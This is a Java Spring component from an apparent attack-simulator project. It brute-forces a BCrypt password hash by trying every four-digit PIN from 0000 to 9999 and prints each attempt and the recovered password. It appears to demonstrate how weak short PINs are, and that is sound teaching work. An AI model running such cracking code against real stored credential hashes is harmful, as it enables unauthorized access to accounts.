package com.example.attacksimulator.attack;

import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

@Component
public class PasswordBruteForceAttack {

	private final PasswordEncoder passwordEncoder;

	public PasswordBruteForceAttack(
			PasswordEncoder passwordEncoder) {

		this.passwordEncoder = passwordEncoder;
	}

	public String generateCandidate(int number) {

		if (number < 0 || number > 9999) {

			throw new IllegalArgumentException(
					"4桁パスワードの範囲は0000～9999です。");
		}

		return String.format("%04d", number);
	}

	/**
	 * BCryptハッシュに対して
	 * 4桁パスワードを総当たりする
	 *
	 * @param targetPasswordHash
	 *        DBに保存されているBCryptハッシュ
	 */
	public AttackResult execute(
			String targetPasswordHash) {

		if (targetPasswordHash == null
				|| targetPasswordHash.isBlank()) {

			throw new IllegalArgumentException(
					"対象パスワードのハッシュがありません。");
		}

		int attemptCount = 0;

		for (int i = 0; i <= 9999; i++) {

			String candidate =
					generateCandidate(i);

			attemptCount++;

			System.out.println(
					"Attempt "
							+ attemptCount
							+ " : candidate="
							+ candidate);

			if (passwordEncoder.matches(
					candidate,
					targetPasswordHash)) {

				System.out.println(
						"----------------------------------------");

				System.out.println(
						"Password found!");

				System.out.println(
						"Password = " + candidate);

				System.out.println(
						"Attempts = "
								+ attemptCount);

				System.out.println(
						"----------------------------------------");

				return new AttackResult(
						true,
						candidate,
						attemptCount);
			}
		}

		System.out.println(
				"----------------------------------------");

		System.out.println(
				"Password not found.");

		System.out.println(
				"Attempts = " + attemptCount);

		System.out.println(
				"----------------------------------------");

		return new AttackResult(
				false,
				null,
				attemptCount);
	}

	public static class AttackResult {

		private final boolean success;

		private final String password;

		private final int attemptCount;

		public AttackResult(
				boolean success,
				String password,
				int attemptCount) {

			this.success = success;
			this.password = password;
			this.attemptCount = attemptCount;
		}

		public boolean isSuccess() {
			return success;
		}

		public String getPassword() {
			return password;
		}

		public int getAttemptCount() {
			return attemptCount;
		}
	}
}